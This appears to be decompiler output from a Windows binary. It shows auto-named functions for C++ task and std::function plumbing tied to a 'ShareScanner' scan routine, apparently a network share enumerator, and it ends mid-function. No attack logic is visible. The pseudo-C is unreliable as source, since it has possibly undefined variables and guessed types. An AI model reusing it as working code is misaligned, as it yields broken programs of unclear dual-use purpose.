// 4FCFF8: using guessed type void **___R0_AV_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_5__Z__8;

//----- (0040B480) --------------------------------------------------------
char __thiscall sub_40B480(_DWORD *this)
{
  int v1; // ecx

  v1 = this[11];
  if ( !v1 )
    std::_Xbad_function_call();
  (*(void (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
  return 0;
}

//----- (0040B4A0) --------------------------------------------------------
_DWORD *__thiscall sub_40B4A0(_DWORD *this, int a2)
{
  _DWORD *v3; // esi
  int (__thiscall ***v4)(_DWORD, int); // ecx

  v3 = operator new(0x30u);
  *v3 = ___7___Func_impl_no_alloc_V_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_6__Z_E__V_std__6B_;
  v3[11] = 0;
  v4 = (int (__thiscall ***)(_DWORD, int))this[11];
  if ( v4 )
    v3[11] = (**v4)(v4, (int)(v3 + 2));
  return v3;
}
// 49DE74: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_6__Z_E__V_std__6B_[2])(int);

//----- (0040B520) --------------------------------------------------------
void ***sub_40B520()
{
  return &___R0_AV_lambda_1___4___ScheduleContinuationTask__Task_impl_base_details_Concurrency__QAEXPAU_ContinuationTaskHandleBase_34__Z__8;
}
// 4FDF40: using guessed type void **___R0_AV_lambda_1___4___ScheduleContinuationTask__Task_impl_base_details_Concurrency__QAEXPAU_ContinuationTaskHandleBase_34__Z__8;

//----- (0040B530) --------------------------------------------------------
int __thiscall sub_40B530(int *this)
{
  return sub_407B30(this + 1);
}

//----- (0040B540) --------------------------------------------------------
_DWORD *__thiscall sub_40B540(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = std::X$$V::Z::_Func_impl_no_alloc<`Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable';
  a2[1] = this[1];
  return result;
}
// 49DED4: using guessed type int (__stdcall *std::X$$V::Z::_Func_impl_no_alloc<`Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int);

//----- (0040B560) --------------------------------------------------------
void __thiscall sub_40B560(_DWORD *Block, char a2)
{
  volatile signed __int32 *v3; // esi

  v3 = (volatile signed __int32 *)Block[3];
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  if ( a2 )
    sub_44775B(Block);
}

//----- (0040B5B0) --------------------------------------------------------
void ***sub_40B5B0()
{
  return &___R0_AV_lambda_1___7___R0_4___ScheduleContinuationTask__Task_impl_base_details_Concurrency__QAEXPAU_ContinuationTaskHandleBase_34__Z_QBE_XZ__8;
}
// 4FCF60: using guessed type void **___R0_AV_lambda_1___7___R0_4___ScheduleContinuationTask__Task_impl_base_details_Concurrency__QAEXPAU_ContinuationTaskHandleBase_34__Z_QBE_XZ__8;

//----- (0040B5C0) --------------------------------------------------------
int __thiscall sub_40B5C0(int this)
{
  return sub_4078B0(*(_DWORD **)(this + 8), *(_DWORD *)(this + 4), -1);
}

//----- (0040B5D0) --------------------------------------------------------
_DWORD *__thiscall sub_40B5D0(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  *a2 = std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable';
  a2[1] = this[1];
  result = a2;
  a2[2] = 0;
  a2[3] = 0;
  a2[2] = this[2];
  a2[3] = this[3];
  this[2] = 0;
  this[3] = 0;
  return result;
}
// 49DEB8: using guessed type int (__stdcall *std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int);

//----- (0040B620) --------------------------------------------------------
_DWORD *__thiscall sub_40B620(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  _DWORD *result; // eax

  *a2 = std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable';
  a2[1] = this[1];
  a2[2] = 0;
  a2[3] = 0;
  v2 = this[3];
  if ( v2 )
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 4));
  result = a2;
  a2[2] = this[2];
  a2[3] = this[3];
  return result;
}
// 49DEB8: using guessed type int (__stdcall *std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int);

//----- (0040B670) --------------------------------------------------------
char *__thiscall sub_40B670(char *Block, char a2)
{
  int v3; // ecx
  volatile signed __int32 *v4; // edi

  *(_DWORD *)Block = &std::_Task_async_state<void>::`vftable';
  v3 = *((_DWORD *)Block + 42);
  if ( !v3 )
    sub_406FA0(0);
  sub_407670(v3);
  v4 = (volatile signed __int32 *)*((_DWORD *)Block + 43);
  if ( v4 )
  {
    if ( !_InterlockedExchangeAdd(v4 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v4)(v4);
      if ( !_InterlockedDecrement(v4 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    }
  }
  sub_40B720(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49DE2C: using guessed type void *std::_Task_async_state<void>::`vftable';

//----- (0040B720) --------------------------------------------------------
void __thiscall sub_40B720(char *this)
{
  char *v2; // ecx
  bool v3; // zf

  v2 = (char *)*((_DWORD *)this + 41);
  if ( v2 )
  {
    (*(void (__stdcall **)(bool))(*(_DWORD *)v2 + 16))(v2 != this + 128);
    *((_DWORD *)this + 41) = 0;
  }
  v3 = this[117] == 0;
  *(_DWORD *)this = &std::_Associated_state<int>::`vftable';
  if ( !v3 && !*((_DWORD *)this + 28) )
    _Cnd_unregister_at_thread_exit((_Mtx_t)(this + 20));
  _Cnd_destroy_in_situ((_Cnd_t)(this + 68));
  _Mtx_destroy_in_situ((_Mtx_t)(this + 20));
  __ExceptionPtrDestroy(this + 12);
}
// 49DE10: using guessed type void *std::_Associated_state<int>::`vftable';

//----- (0040B790) --------------------------------------------------------
int __thiscall sub_40B790(int *this)
{
  int v2; // ecx
  int v3; // eax
  int v4; // eax
  int result; // eax
  const struct std::error_code *v6; // eax
  int v7; // [esp+0h] [ebp-3Ch] BYREF
  _Mtx_t v8[4]; // [esp+10h] [ebp-2Ch] BYREF
  _Mtx_t v9[2]; // [esp+20h] [ebp-1Ch] BYREF
  int *v10; // [esp+2Ch] [ebp-10h]
  int v11; // [esp+38h] [ebp-4h]

  v10 = &v7;
  v11 = 0;
  v2 = this[41];
  v8[3] = (_Mtx_t)this;
  if ( !v2 )
    std::_Xbad_function_call();
  (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 8))(v2);
  v9[1] = 0;
  v9[0] = (_Mtx_t)(this + 5);
  v3 = _Mtx_lock((_Mtx_t)(this + 5));
  if ( v3 )
    std::_Throw_C_error(v3);
  LOBYTE(v9[1]) = 1;
  LOBYTE(v11) = 1;
  if ( *((_BYTE *)this + 117) )
  {
    v6 = (const struct std::error_code *)sub_407EE0(v8, 3);
    std::_Throw_future_error(v6);
  }
  v4 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _Mtx_t *, _DWORD))(v4 + 20))(this, v9, 0);
  LOBYTE(v11) = 2;
  if ( LOBYTE(v9[1]) )
  {
    result = _Mtx_unlock(v9[0]);
    if ( result )
      std::_Throw_C_error(result);
  }
  return result;
}

//----- (0040B8C0) --------------------------------------------------------
int __thiscall sub_40B8C0(int this, __int128 *a2)
{
  int *v3; // edi
  int *v4; // eax
  int v5; // ecx
  int *v6; // eax
  int v7; // ecx
  int v8; // edx
  volatile signed __int32 *v9; // edi
  volatile signed __int32 *v10; // edi
  int result; // eax
  int v12; // [esp-30h] [ebp-5Ch]
  _BYTE v13[12]; // [esp-20h] [ebp-4Ch] BYREF
  int v14; // [esp-14h] [ebp-40h]
  int v15; // [esp-10h] [ebp-3Ch]
  int v16; // [esp-Ch] [ebp-38h]
  int v17; // [esp-8h] [ebp-34h]
  __int16 v18; // [esp-4h] [ebp-30h]
  volatile signed __int32 *v19; // [esp+14h] [ebp-18h]
  _BYTE *v20; // [esp+18h] [ebp-14h]
  int v21; // [esp+1Ch] [ebp-10h]
  int v22; // [esp+28h] [ebp-4h]

  v21 = this;
  sub_40BA10((char *)this, a2);
  v22 = 0;
  v3 = (int *)(this + 168);
  *(_DWORD *)this = &std::_Task_async_state<void>::`vftable';
  *(_DWORD *)(this + 168) = 0;
  *(_DWORD *)(this + 172) = 0;
  LOBYTE(v22) = 1;
  v4 = (int *)sub_406770();
  v5 = v4[1];
  if ( v5 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 4));
    v5 = v4[1];
  }
  v12 = *v4;
  LOBYTE(v22) = 3;
  v20 = v13;
  unknown_libname_8(v12, v5, v12, 0);
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v14 = 0;
  v13[8] = 0;
  v18 = 0;
  LOBYTE(v22) = 1;
  v6 = (int *)sub_40BAC0(this);
  if ( v3 != v6 )
  {
    v7 = *v6;
    v8 = v6[1];
    *v6 = 0;
    v6[1] = 0;
    *v3 = v7;
    v9 = *(volatile signed __int32 **)(this + 172);
    *(_DWORD *)(this + 172) = v8;
    if ( v9 )
    {
      if ( !_InterlockedExchangeAdd(v9 + 1, 0xFFFFFFFF) )
      {
        (**(void (__thiscall ***)(volatile signed __int32 *))v9)(v9);
        if ( !_InterlockedExchangeAdd(v9 + 2, 0xFFFFFFFF) )
          (*(void (__thiscall **)(volatile signed __int32 *))(*v9 + 4))(v9);
      }
    }
  }
  v10 = v19;
  if ( v19 )
  {
    if ( !_InterlockedExchangeAdd(v19 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v10)(v10);
      if ( !_InterlockedDecrement(v10 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v10 + 4))(v10);
    }
  }
  result = this;
  *(_BYTE *)(this + 118) = 1;
  return result;
}
// 42F174: using guessed type int __cdecl unknown_libname_8(_DWORD, _DWORD, _DWORD, _DWORD);
// 49DE2C: using guessed type void *std::_Task_async_state<void>::`vftable';

//----- (0040BA10) --------------------------------------------------------
char *__thiscall sub_40BA10(char *this, __int128 *a2)
{
  __int128 v3; // xmm0
  __int64 v4; // xmm1_8
  char *result; // eax
  int v6; // ecx
  int v7; // edx

  *(_DWORD *)this = &std::_Associated_state<int>::`vftable';
  *((_DWORD *)this + 1) = 1;
  __ExceptionPtrCreate(this + 12);
  _Mtx_init_in_situ((_Mtx_t)(this + 20), 2);
  sub_42F834(this + 68);
  this[108] = 0;
  *((_DWORD *)this + 28) = 0;
  *((_WORD *)this + 58) = 0;
  this[118] = 0;
  *((_DWORD *)this + 30) = 0;
  *(_DWORD *)this = &std::_Packaged_state<void __cdecl (void)>::`vftable';
  v3 = *a2;
  v4 = *((_QWORD *)a2 + 2);
  *(_WORD *)a2 = 0;
  result = this;
  *((_DWORD *)a2 + 4) = 0;
  *((_DWORD *)a2 + 5) = 7;
  v6 = *((_DWORD *)a2 + 6);
  v7 = *((_DWORD *)a2 + 7);
  *((_DWORD *)this + 32) = &___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_;
  *(_OWORD *)(this + 132) = v3;
  *(_QWORD *)(this + 148) = v4;
  *((_DWORD *)this + 39) = v6;
  *((_DWORD *)this + 40) = v7;
  *((_DWORD *)this + 41) = this + 128;
  return result;
}
// 42F834: using guessed type _DWORD __cdecl sub_42F834(_DWORD);
// 49DD98: using guessed type void *std::_Packaged_state<void __cdecl (void)>::`vftable';
// 49DDE8: using guessed type void (__cdecl __noreturn *___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_)(void *);
// 49DE10: using guessed type void *std::_Associated_state<int>::`vftable';

//----- (0040BAC0) --------------------------------------------------------
_QWORD *sub_40BAC0(int a1, ...)
{
  int v1; // ecx
  _QWORD *v2; // esi
  void *v3; // edx
  void *Block[4]; // [esp+8h] [ebp-20h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]
  void *retaddr; // [esp+2Ch] [ebp+4h]
  int v9; // [esp+34h] [ebp+Ch] BYREF
  va_list va; // [esp+34h] [ebp+Ch]
  int v11; // [esp+38h] [ebp+10h]
  int v12; // [esp+3Ch] [ebp+14h]
  int v13; // [esp+40h] [ebp+18h]
  int v14; // [esp+44h] [ebp+1Ch]
  int v15; // [esp+48h] [ebp+20h]
  int v16; // [esp+4Ch] [ebp+24h]
  va_list va1; // [esp+50h] [ebp+28h] BYREF

  va_start(va1, a1);
  va_start(va, a1);
  v9 = va_arg(va1, _DWORD);
  v11 = va_arg(va1, _DWORD);
  v12 = va_arg(va1, _DWORD);
  v13 = va_arg(va1, _DWORD);
  v14 = va_arg(va1, _DWORD);
  v15 = va_arg(va1, _DWORD);
  v16 = va_arg(va1, _DWORD);
  v2 = (_QWORD *)v1;
  v6 = v1;
  v7 = 1;
  memset(&Block[1], 0, 12);
  Block[0] = retaddr;
  LOBYTE(v16) = 1;
  sub_4072C0((unsigned int *)va1, (unsigned int *)Block);
  LOBYTE(v7) = 0;
  v3 = Block[1];
  if ( Block[1] )
  {
    if ( ((Block[3] - Block[1]) & 0xFFFFFFFC) >= 0x1000 )
    {
      v3 = (void *)*((_DWORD *)Block[1] - 1);
      if ( (unsigned int)(Block[1] - v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v3);
  }
  *v2 = 0i64;
  sub_40BC20((int)v2, a1, (int)va);
  sub_407DF0((int *)va);
  return v2;
}
// 40BAE6: variable 'v1' is possibly undefined

//----- (0040BBA0) --------------------------------------------------------
char *__thiscall sub_40BBA0(char *Block, char a2)
{
  sub_40B720(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0040BBD0) --------------------------------------------------------
_DWORD *__thiscall sub_40BBD0(_DWORD *this, int a2)
{
  this[4] = 0;
  this[5] = 0;
  *(_OWORD *)this = *(_OWORD *)a2;
  *((_QWORD *)this + 2) = *(_QWORD *)(a2 + 16);
  *(_WORD *)a2 = 0;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 7;
  this[6] = *(_DWORD *)(a2 + 24);
  this[7] = *(_DWORD *)(a2 + 28);
  return this;
}

//----- (0040BC20) --------------------------------------------------------
int __thiscall sub_40BC20(int this, int a2, int a3)
{
  volatile signed __int32 *v4; // edi
  int v5; // eax
  int v6; // eax
  unsigned int *v7; // edx
  int v8; // eax
  char *v9; // ecx
  char v10; // al
  void *v11; // ecx
  void *v12; // ecx
  _DWORD *v13; // edi
  int v14; // eax
  char *v15; // ecx
  unsigned int v17; // [esp+Ch] [ebp-40h] BYREF
  void *v18; // [esp+10h] [ebp-3Ch]
  int v19; // [esp+18h] [ebp-34h]
  volatile signed __int32 *v20; // [esp+1Ch] [ebp-30h]
  int v21; // [esp+20h] [ebp-2Ch]
  void *Block[4]; // [esp+24h] [ebp-28h] BYREF
  _DWORD *v23; // [esp+34h] [ebp-18h]
  int v24; // [esp+38h] [ebp-14h]
  char *v25; // [esp+3Ch] [ebp-10h]
  int v26; // [esp+48h] [ebp-4h]
  void *retaddr; // [esp+50h] [ebp+4h]

  v21 = this;
  v25 = 0;
  v24 = a3;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  v26 = 0;
  v4 = *(volatile signed __int32 **)(a3 + 12);
  if ( v4 )
    _InterlockedIncrement(v4 + 1);
  v20 = v4;
  LOBYTE(v26) = 1;
  v5 = (int)v4;
  if ( !v4 )
    v5 = 2;
  v25 = (char *)v5;
  v6 = *(_DWORD *)(a3 + 4);
  if ( v6 )
    _InterlockedIncrement((volatile signed __int32 *)(v6 + 4));
  sub_4096F0((char **)this, (int)v25, *(_QWORD *)a3, *(_DWORD *)(a3 + 8));
  LOBYTE(v26) = 2;
  if ( v4 && !_InterlockedDecrement(v4 + 1) )
    (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
  LOBYTE(v26) = 0;
  if ( *(_BYTE *)(v24 + 24) )
  {
    v7 = sub_407250(&v17, (unsigned int *)(v24 + 28));
    LOBYTE(v26) = 3;
    v8 = 1;
  }
  else
  {
    memset(&Block[1], 0, 12);
    Block[0] = retaddr;
    v7 = (unsigned int *)Block;
    v26 = 4;
    v8 = 2;
  }
  v9 = *(char **)this;
  v25 = (char *)v8;
  v24 = v8;
  sub_4072C0((unsigned int *)v9 + 46, v7);
  v26 = 3;
  v10 = v24;
  if ( (v24 & 2) != 0 )
  {
    v11 = Block[1];
    v10 = v24 & 0xFD;
    v24 &= ~2u;
    if ( Block[1] )
    {
      if ( (unsigned int)(4 * ((Block[3] - Block[1]) >> 2)) >= 0x1000 )
      {
        v11 = (void *)*((_DWORD *)Block[1] - 1);
        if ( (unsigned int)(Block[1] - v11 - 4) > 0x1F )
          goto LABEL_26;
      }
      sub_44775B(v11);
      v10 = v24;
    }
  }
  v26 = 0;
  if ( (v10 & 1) != 0 )
  {
    v12 = v18;
    if ( v18 )
    {
      if ( (unsigned int)(4 * ((v19 - (int)v18) >> 2)) < 0x1000
        || (v12 = (void *)*((_DWORD *)v18 - 1), (unsigned int)((_BYTE *)v18 - (_BYTE *)v12 - 4) <= 0x1F) )
      {
        sub_44775B(v12);
        goto LABEL_23;
      }
LABEL_26:
      _invalid_parameter_noinfo_noreturn();
    }
  }
LABEL_23:
  *(_BYTE *)(*(_DWORD *)this + 8) = 0;
  *(_BYTE *)(*(_DWORD *)this + 9) = 0;
  nullsub_1(0);
  v25 = *(char **)this;
  v13 = operator new(0x10u);
  v23 = v13;
  *v13 = &___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_;
  v13[1] = 0;
  v13[2] = 0;
  v14 = *(_DWORD *)(this + 4);
  if ( v14 )
    _InterlockedIncrement((volatile signed __int32 *)(v14 + 4));
  v15 = v25;
  v13[1] = *(_DWORD *)this;
  v13[2] = *(_DWORD *)(this + 4);
  *v13 = &___7___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__6B_;
  v13[3] = a2;
  sub_4078B0(v15, (int)v13, 0);
  return this;
}
// 409260: using guessed type _DWORD __stdcall nullsub_1(_DWORD);
// 49DE04: using guessed type int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char);
// 49DE68: using guessed type int (__thiscall *___7___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__6B_)(void *Block, char);

//----- (0040BE80) --------------------------------------------------------
void __thiscall sub_40BE80(_DWORD *Block, char a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v3 = Block[6];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)Block[1];
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_44775B(v4);
  }
  Block[5] = 0;
  Block[6] = 7;
  *((_WORD *)Block + 2) = 0;
  if ( a2 )
    sub_44775B(Block);
}

//----- (0040BEF0) --------------------------------------------------------
void ***sub_40BEF0()
{
  return &___R0_AV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std___8;
}
// 4FDDC0: using guessed type void **___R0_AV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std___8;

//----- (0040BF00) --------------------------------------------------------
void __thiscall sub_40BF00(int this)
{
  sub_408480((void *)(this + 28), this + 4);
}

//----- (0040BF10) --------------------------------------------------------
int __thiscall sub_40BF10(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_;
  *(_DWORD *)(a2 + 20) = 0;
  *(_DWORD *)(a2 + 24) = 0;
  *(_OWORD *)(a2 + 4) = *(_OWORD *)(this + 4);
  *(_QWORD *)(a2 + 20) = *(_QWORD *)(this + 20);
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 24) = 7;
  *(_WORD *)(this + 4) = 0;
  *(_DWORD *)(a2 + 28) = *(_DWORD *)(this + 28);
  *(_DWORD *)(a2 + 32) = *(_DWORD *)(this + 32);
  return result;
}
// 49DDE8: using guessed type void (__cdecl __noreturn *___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_)(void *);

//----- (0040BF70) --------------------------------------------------------
void __cdecl __noreturn sub_40BF70(void *a1)
{
  int v1; // ecx
  _DWORD *v2; // eax
  void *v3; // [esp-4h] [ebp-4h]

  v3 = (void *)(v1 + 4);
  v2 = operator new(0x24u, a1);
  sub_40BF90(v2, v3);
}
// 40BF76: variable 'v1' is possibly undefined

//----- (0040BF90) --------------------------------------------------------
void __thiscall __noreturn sub_40BF90(_DWORD *this, void *a2)
{
  void *v2; // eax

  *this = &___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_;
  v2 = sub_40C330(a2);
  sub_40C140(v2);
}
// 49DDE8: using guessed type void (__cdecl __noreturn *___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_)(void *);

//----- (0040BFB0) --------------------------------------------------------
int __thiscall sub_40BFB0(_DWORD *this)
{
  int v2; // ecx
  int result; // eax
  char v4; // bl
  char *v5; // eax
  int v6[10]; // [esp-28h] [ebp-84h] BYREF
  int v7; // [esp+0h] [ebp-5Ch] BYREF
  char v8[36]; // [esp+10h] [ebp-4Ch] BYREF
  char *v9; // [esp+34h] [ebp-28h]
  int v10; // [esp+40h] [ebp-1Ch]
  int v11; // [esp+44h] [ebp-18h]
  _DWORD *v12; // [esp+48h] [ebp-14h]
  int *v13; // [esp+4Ch] [ebp-10h]
  int v14; // [esp+58h] [ebp-4h]

  v13 = &v7;
  v2 = this[1];
  v12 = this;
  if ( !(unsigned __int8)sub_40C2A0(v2) )
    return (*(int (__stdcall **)(int, _DWORD, _DWORD, int))(*(_DWORD *)this[1] + 4))(1, 0, 0, this[1] + 12);
  v14 = 0;
  v11 = this[1];
  sub_407D00(
    (int)___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_X__V_std__6B_,
    this[3],
    v6[2],
    v6[3],
    v6[4],
    v6[5],
    v6[6],
    v6[7],
    v6[8],
    v6);
  LOBYTE(v14) = 1;
  v10 = this[1] + 200;
  LOBYTE(v14) = 2;
  if ( !v9 )
    std::_Xbad_function_call();
